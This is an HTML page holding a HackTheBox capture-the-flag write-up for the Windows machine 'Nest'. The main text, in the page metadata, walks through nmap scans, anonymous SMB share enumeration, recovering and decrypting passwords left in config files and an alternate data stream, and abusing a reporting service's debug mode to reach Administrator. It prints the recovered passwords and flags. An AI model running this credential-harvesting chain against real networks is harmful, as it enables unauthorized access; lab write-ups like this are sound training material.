<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Nest | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,easy"><meta name=description content="Nest HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/nest/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/nest/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Nest "><meta property="og:description" content="Nest HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/nest/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/nest/nest.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-06-05T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/nest/nest.png"><meta name=twitter:title content="Nest "><meta name=twitter:description content="Nest HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Nest ","item":"https://s4ch.github.io/writeups/hackthebox/nest/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Nest ","name":"Nest ","description":"Nest HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","easy"],"articleBody":"≡ƒÆó Info Name: Nest Profile: www.hackthebox.eu Difficulty: Easy OS: Windows Points: 20 Overview Network Enumeration: finding TempUser: port 445 (SMB), 4386, explore SMB shares Network Exploration: finding c.smith: listing SMB shares again Alternate Data Stream (ADS): password of HQK Reporting via ADS Network service exploitation: finding Administrator: HQK Reporting debug mode, read LDAP config for Admin password Network Enumeration: finding TempUser TL;DR: port 445 (SMB), 4386, explore SMB shares\nI started with SYN scan on all ports with nmap:\nBlackArch: pacman -S nmap\n$ sudo nmap -sS -p- 10.10.10.178 -o nmap_ports [sudo] password for cyfun: Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 21:05 CET Stats: 0:04:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 28.81% done; ETC: 21:19 (0:10:03 remaining) Nmap scan report for 10.10.10.178 Host is up (0.051s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 445/tcp open microsoft-ds 4386/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 543.24 seconds $ sudo nmap -sSVC -p 445,4386 10.10.10.178 -o nmap_services Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 21:24 CET Stats: 0:02:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 21:28 (0:02:02 remaining) Nmap scan report for 10.10.10.178 Host is up (0.031s latency). PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR | RUNQUERY | DEBUG |_ HELP 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4386-TCP:V=7.80%I=7%D=3/23%Time=5E791B05%P=x86_64-unknown-linux-gnu SF:%r(NULL,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(Gener SF:icLines,3A,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\\r\\nUnreco SF:gnised\\x20command\\r\\n\u003e\")%r(GetRequest,3A,\"\\r\\nHQK\\x20Reporting\\x20Servi SF:ce\\x20V1\\.2\\r\\n\\r\\n\u003e\\r\\nUnrecognised\\x20command\\r\\n\u003e\")%r(HTTPOptions,3A SF:,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\\r\\nUnrecognised\\x20 SF:command\\r\\n\u003e\")%r(RTSPRequest,3A,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\ SF:.2\\r\\n\\r\\n\u003e\\r\\nUnrecognised\\x20command\\r\\n\u003e\")%r(RPCCheck,21,\"\\r\\nHQK\\x2 SF:0Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(DNSVersionBindReqTCP,21,\"\\r SF:\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(DNSStatusRequestTCP SF:,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(Help,F2,\"\\r\\ SF:nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\\r\\nThis\\x20service\\x20al SF:lows\\x20users\\x20to\\x20run\\x20queries\\x20against\\x20databases\\x20using\\ SF:x20the\\x20legacy\\x20HQK\\x20format\\r\\n\\r\\n---\\x20AVAILABLE\\x20COMMANDS\\x SF:20---\\r\\n\\r\\nLIST\\r\\nSETDIR\\x20\\r\\nRUNQUERY\\x20\\r\\nDEBUG\\x20\\r\\nHELP\\x20\\r\\n\u003e\")%r(SSLSessionReq,2 SF:1,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(TerminalServer SF:Cookie,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(TLSSes SF:sionReq,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(Kerbe SF:ros,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(SMBProgNe SF:g,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(X11Probe,21 SF:,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(FourOhFourReque SF:st,3A,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\\r\\nUnrecognise SF:d\\x20command\\r\\n\u003e\")%r(LPDString,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20 SF:V1\\.2\\r\\n\\r\\n\u003e\")%r(LDAPSearchReq,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x2 SF:0V1\\.2\\r\\n\\r\\n\u003e\")%r(LDAPBindReq,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20 SF:V1\\.2\\r\\n\\r\\n\u003e\")%r(SIPOptions,3A,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1 SF:\\.2\\r\\n\\r\\n\u003e\\r\\nUnrecognised\\x20command\\r\\n\u003e\")%r(LANDesk-RC,21,\"\\r\\nHQK SF:\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(TerminalServer,21,\"\\r\\nH SF:QK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\"); Host script results: |_clock-skew: 2m28s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-23T20:29:44 |_ start_date: 2020-03-23T19:20:32 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 206.45 seconds So we have SMBv2 + unknown service on port 4386.\nCrackMapExec, smb-enum-shares.nse and enum4linux don’t find any shares because they support only SMB v1 that is disabled.\nBut smbclient and msf modules works. So let’s start metasploit console (msfconsole).\nBlackArch: pacman -S metasploit\nmsf5 auxiliary(scanner/smb/smb_enumshares) \u003e run [+] 10.10.10.178:445 - ADMIN$ - (DISK) Remote Admin [+] 10.10.10.178:445 - C$ - (DISK) Default share [+] 10.10.10.178:445 - Data - (DISK) [+] 10.10.10.178:445 - IPC$ - (IPC) Remote IPC [+] 10.10.10.178:445 - Secure$ - (DISK) [+] 10.10.10.178:445 - Users - (DISK) [*] 10.10.10.178: - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(scanner/smb/smb2) \u003e run [+] 10.10.10.178:445 - 10.10.10.178 supports SMB 2 [dialect 255.2] and has been online for 1 hours [*] 10.10.10.178:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed I found a few SMBv2 shares with metasploit but we can do the same thing with smbclient.\nBlackArch: pacman -S smbclient\n$ smbclient -L 10.10.10.178 -N Unable to initialize messaging context Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share Data Disk IPC$ IPC Remote IPC Secure$ Disk Users Disk Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.178 failed (Error NT_STATUS_IO_TIMEOUT) Unable to connect with SMB1 -- no workgroup available We can anonymously connect to Users share and list folders in there to list users:\n$ smbclient -N \\\\\\\\10.10.10.178\\\\Users Unable to initialize messaging context Try \"help\" to get a list of possible commands. smb: \\\u003e recurse on smb: \\\u003e prompt off smb: \\\u003e mget * NT_STATUS_ACCESS_DENIED listing \\Administrator\\* NT_STATUS_ACCESS_DENIED listing \\C.Smith\\* NT_STATUS_ACCESS_DENIED listing \\L.Frost\\* NT_STATUS_ACCESS_DENIED listing \\R.Thompson\\* NT_STATUS_ACCESS_DENIED listing \\TempUser\\* This way we found 5 users.\nCurrently we can’t enumerate what is inside Secure share.\n$ smbclient -N \\\\\\\\10.10.10.178\\\\Secure Unable to initialize messaging context tree connect failed: NT_STATUS_BAD_NETWORK_NAME By enumerating the Data share we can find some interesting files:\n$ smbclient -N \\\\\\\\10.10.10.178\\\\Data Unable to initialize messaging context Try \"help\" to get a list of possible commands. smb: \\\u003e recurse on smb: \\\u003e prompt off smb: \\\u003e mget * NT_STATUS_ACCESS_DENIED listing \\IT\\* NT_STATUS_ACCESS_DENIED listing \\Production\\* NT_STATUS_ACCESS_DENIED listing \\Reports\\* getting file \\Shared\\Maintenance\\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec) getting file \\Shared\\Templates\\HR\\Welcome Email.txt of size 425 as Welcome Email.txt (0,5 KiloBytes/sec) (average 0,5 KiloBytes/sec) By reading a welcome email we can find a generic account:\n$ cat smb/Shared/Templates/HR/Welcome\\ Email.txt We would like to extend a warm welcome to our newest member of staff, You will find your home folder in the following location: \\\\HTB-NEST\\Users\\ If you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you. Username: TempUser Password: welcome2019 Thank you HR Network Exploration: finding c.smith TL;DR: listing SMB shares again\nWe can enumerate Data share again but using the TempUser account this time, to list files we weren’t able to see earlier:\n$ smbclient \\\\\\\\10.10.10.178\\\\Data -U TempUser Unable to initialize messaging context Enter WORKGROUP\\TempUser's password: Try \"help\" to get a list of possible commands. smb: \\\u003e recurse on smb: \\\u003e prompt off smb: \\\u003e mget * getting file \\IT\\Configs\\Adobe\\editing.xml of size 246 as editing.xml (1,9 KiloBytes/sec) (average 1,9 KiloBytes/sec) getting file \\IT\\Configs\\Adobe\\Options.txt of size 0 as Options.txt (0,0 KiloBytes/sec) (average 1,1 KiloBytes/sec) getting file \\IT\\Configs\\Adobe\\projects.xml of size 258 as projects.xml (0,4 KiloBytes/sec) (average 0,6 KiloBytes/sec) getting file \\IT\\Configs\\Adobe\\settings.xml of size 1274 as settings.xml (10,0 KiloBytes/sec) (average 1,8 KiloBytes/sec) getting file \\IT\\Configs\\Atlas\\Temp.XML of size 1369 as Temp.XML (4,1 KiloBytes/sec) (average 2,4 KiloBytes/sec) getting file \\IT\\Configs\\Microsoft\\Options.xml of size 4598 as Options.xml (36,2 KiloBytes/sec) (average 5,3 KiloBytes/sec) getting file \\IT\\Configs\\NotepadPlusPlus\\config.xml of size 6451 as config.xml (50,4 KiloBytes/sec) (average 8,9 KiloBytes/sec) getting file \\IT\\Configs\\NotepadPlusPlus\\shortcuts.xml of size 2108 as shortcuts.xml (16,6 KiloBytes/sec) (average 9,5 KiloBytes/sec) getting file \\IT\\Configs\\RU Scanner\\RU_config.xml of size 270 as RU_config.xml (2,1 KiloBytes/sec) (average 9,0 KiloBytes/sec) getting file \\Shared\\Maintenance\\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0,4 KiloBytes/sec) (average 8,4 KiloBytes/sec) getting file \\Shared\\Templates\\HR\\Welcome Email.txt of size 425 as Welcome Email.txt (3,4 KiloBytes/sec) (average 8,1 KiloBytes/sec) One of the file we retrieved is containing a password:\n$ grep -ri pass smb smb/IT/Configs/RU Scanner/RU_config.xml: fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= smb/Shared/Templates/HR/Welcome Email.txt:Password: welcome2019 $ cat 'smb/IT/Configs/RU Scanner/RU_config.xml' \u003c?xml version=\"1.0\"?\u003e 389 c.smith fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= The RU Scanner password is ciphered but pasting fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= in a search we can find some code snippets that are able to decipher it.\nVB.Net: https://dotnetfiddle.net/kiYWi4 VB.Net: https://dotnetfiddle.net/vYnZLb Deciphered password is xRxRxPANCAK3SxRxRx for c.smith user.\nThere is another file hinting us some files:\n$ tail smb/IT/Configs/NotepadPlusPlus/config.xml So we can go back to Users share with a real user this time (c.smith) and download all his personal files.\n$ smbclient \\\\\\\\10.10.10.178\\\\Users -U 'c.smith' smb: \\\u003e recurse on smb: \\\u003e prompt off smb: \\\u003e mget * NT_STATUS_ACCESS_DENIED listing \\Administrator\\* getting file \\C.Smith\\HQK Reporting\\AD Integration Module\\HqkLdap.exe of size 17408 as HqkLdap.exe (42,7 KiloBytes/sec) (average 42,7 KiloBytes/sec) getting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt of size 0 as Debug Mode Password.txt (0,0 KiloBytes/sec) (average 34,7 KiloBytes/sec) getting file \\C.Smith\\HQK Reporting\\HQK_Config_Backup.xml of size 249 as HQK_Config_Backup.xml (1,9 KiloBytes/sec) (average 27,8 KiloBytes/sec) getting file \\C.Smith\\user.txt of size 32 as user.txt (0,3 KiloBytes/sec) (average 23,2 KiloBytes/sec) NT_STATUS_ACCESS_DENIED listing \\L.Frost\\* NT_STATUS_ACCESS_DENIED listing \\R.Thompson\\* NT_STATUS_ACCESS_DENIED listing \\TempUser\\* This is where we find the user flag:\ncat smb/C.Smith/user.txt cf71b25404be5d84fd827e05f426e987 Alternate Data Stream (ADS) TL;DR: password of HQK Reporting via ADS\nInside Users share, in the C.Smith folder, there are files related to HQK Reporting software.\nThere is a promising Debug Mode Password.txt files but the files ize is 0 byte.\nThis gives us an hint an ADS (Alternate Data Stream) may be used.\nAs you can see below the default $DATA stream is 0 byte when an alternate stream named Password is 15 bytes. So we can download the file via the non-default data stream.\n$ smbclient \\\\\\\\10.10.10.178\\\\Users -U 'c.smith' Unable to initialize messaging context Enter WORKGROUP\\c.smith's password: Try \"help\" to get a list of possible commands. smb: \\\u003e cd \"C.Smith\\HQK Reporting\" smb: \\C.Smith\\HQK Reporting\\\u003e allinfo \"Debug Mode Password.txt\" altname: DEBUGM~1.TXT create_time: ven. ao├╗t 9 01:06:12 2019 CEST access_time: ven. ao├╗t 9 01:06:12 2019 CEST write_time: ven. ao├╗t 9 01:08:17 2019 CEST change_time: ven. ao├╗t 9 01:08:17 2019 CEST attributes: A (20) stream: [::$DATA], 0 bytes stream: [:Password:$DATA], 15 bytes smb: \\C.Smith\\HQK Reporting\\\u003e get \"Debug Mode Password.txt:Password:$DATA\" getting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt:Password:$DATA of size 15 as Debug Mode Password.txt:Password:$DATA (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec) smb: \\C.Smith\\HQK Reporting\\\u003e In this stream the file contains the password for accessing teh debug mode:\n$ cat smb/Debug\\ Mode\\ Password.txt:Password:\\$DATA WBQ201953D8w Network service exploitation: finding Administrator TL;DR: HQK Reporting debug mode, read LDAP config for Admin password\nNow looking at the backup config file HQK_Config_Backup.xml we can see the service is running on port 4386. The open port we saw earlier with nmap.\n$ cat C.Smith/HQK\\ Reporting/HQK_Config_Backup.xml \u003c?xml version=\"1.0\"?\u003e 4386 C:\\Program Files\\HQK\\ALL QUERIES So let’s open a TCP socket with telnet to interact with the protocol:\n$ telnet 10.10.10.178 4386 Trying 10.10.10.178... Connected to 10.10.10.178. Escape character is '^]'. HQK Reporting Service V1.2 \u003ehelp This service allows users to run queries against databases using the legacy HQK format --- AVAILABLE COMMANDS --- LIST SETDIR RUNQUERY DEBUG HELP We can see there is a DEBUG command requiring a password. All good we have one!\n\u003eDEBUG WBQ201953D8w Debug mode enabled. Use the HELP command to view additional commands that are now available \u003ehelp This service allows users to run queries against databases using the legacy HQK format --- AVAILABLE COMMANDS --- LIST SETDIR RUNQUERY DEBUG HELP SERVICE SESSION SHOWQUERY We have 3 new commands now, but let’s start we the other commands we already had.\n\u003eLIST Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [DIR] COMPARISONS [1] Invoices (Ordered By Customer) [2] Products Sold (Ordered By Customer) [3] Products Sold In Last 30 Days Current Directory: ALL QUERIES It looks like LIST = ls and SETDIR = cd, it’s obvious.\nWe are currently in ALL QUERIES directory. Let’s go back upper in the tree:\n\u003esetdir .. Current directory set to HQK \u003elist Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [DIR] ALL QUERIES [DIR] LDAP [DIR] Logs [1] HqkSvc.exe [2] HqkSvc.InstallState [3] HQK_Config.xml Current Directory: HQK We went in HQK directory and there is a LDAP directory in it. Let’s see this one:\n\u003esetdir LDAP Current directory set to LDAP \u003elist Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [1] HqkLdap.exe [2] Ldap.conf Current Directory: LDAP There is a config file and config files are prone to give passwords, so let’s read it. Hopefully with the debug mode we unlocked the showquery = cat.\n\u003eshowquery 2 Domain=nest.local Port=389 BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local User=Administrator Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4= This password is ciphered too, as earlier let’s paste it in a search engine:\nVB.Net: https://dotnetfiddle.net/LdhDaa C#: https://dotnetfiddle.net/ndCO9U So the deciphered password is: XtH4nkS4Pl4y1nGX.\nLet’s get root flag via the C$ share with the Administrator account:\n$ smbclient '\\\\10.10.10.178\\C$' -U 'Administrator' Unable to initialize messaging context Enter WORKGROUP\\Administrator's password: Try \"help\" to get a list of possible commands. smb: \\\u003e cd Users\\Administrator\\Desktop smb: \\Users\\Administrator\\Desktop\\\u003e ls . DR 0 Sun Jan 26 08:20:50 2020 .. DR 0 Sun Jan 26 08:20:50 2020 desktop.ini AHS 282 Sat Jan 25 23:02:44 2020 root.txt A 32 Tue Aug 6 00:27:26 2019 10485247 blocks of size 4096. 6545277 blocks available smb: \\Users\\Administrator\\Desktop\\\u003e mget root.txt Get file root.txt? y getting file \\Users\\Administrator\\Desktop\\root.txt of size 32 as root.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec) $ cat root.txt 6594c2eb084bc0f08a42f0b94b878c41 ","wordCount":"2046","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/nest/nest.png","datePublished":"2020-06-05T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/nest/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Nest</h1><div class=post-description>Nest HackTheBox writeup</div><div class=post-meta>&lt;span title='2020-06-05 00:00:00 +0000 UTC'>June 5, 2020&lt;/span>&amp;nbsp;·&amp;nbsp;10 min&amp;nbsp;·&amp;nbsp;2046 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hackthebox/" class="post-tag" title="hackthebox">hackthebox&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/windows/" class="post-tag" title="windows">windows&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/easy/" class="post-tag" title="easy">easy&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/nest/nest.png alt="Nest HackTheBox Machine"><p>Nest - Easy Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration-finding-tempuser>Network Enumeration: finding TempUser</a></li><li><a href=#network-exploration-finding-csmith>Network Exploration: finding c.smith</a></li><li><a href=#alternate-data-stream-ads>Alternate Data Stream (ADS)</a></li><li><a href=#network-service-exploitation-finding-administrator>Network service exploitation: finding Administrator</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> Nest</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/225>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 20</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><ul><li><strong>Network Enumeration: finding TempUser</strong>: port 445 (SMB), 4386, explore SMB shares</li><li><strong>Network Exploration: finding c.smith</strong>: listing SMB shares again</li><li><strong>Alternate Data Stream (ADS)</strong>: password of HQK Reporting via ADS</li><li><strong>Network service exploitation: finding Administrator</strong>: HQK Reporting debug mode, read LDAP config for Admin password</li></ul><h3 id=network-enumeration-finding-tempuser>Network Enumeration: finding TempUser<a hidden class=anchor aria-hidden=true href=#network-enumeration-finding-tempuser>#</a></h3><p><strong>TL;DR</strong>: port 445 (SMB), 4386, explore SMB shares</p><p>I started with SYN scan on all ports with <a href=https://nmap.org/>nmap</a>:</p><p><strong>BlackArch</strong>: <code>pacman -S nmap</code></p><pre tabindex=0><code>$ sudo nmap -sS -p- 10.10.10.178 -o nmap_ports
[sudo] password for cyfun:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 21:05 CET
Stats: 0:04:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 28.81% done; ETC: 21:19 (0:10:03 remaining)
Nmap scan report for 10.10.10.178
Host is up (0.051s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
4386/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 543.24 seconds

$ sudo nmap -sSVC -p 445,4386 10.10.10.178 -o nmap_services
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 21:24 CET
Stats: 0:02:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 21:28 (0:02:02 remaining)
Nmap scan report for 10.10.10.178
Host is up (0.031s latency).

PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     Reporting Service V1.2
|     Unrecognised command
|   Help:
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR &lt;Directory_Name&gt;
|     RUNQUERY &lt;Query_ID&gt;
|     DEBUG &lt;Password&gt;
|_    HELP &lt;Command&gt;
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.80%I=7%D=3/23%Time=5E791B05%P=x86_64-unknown-linux-gnu
SF:%r(NULL,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(Gener
SF:icLines,3A,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnreco
SF:gnised\x20command\r\n&gt;&#34;)%r(GetRequest,3A,&#34;\r\nHQK\x20Reporting\x20Servi
SF:ce\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;)%r(HTTPOptions,3A
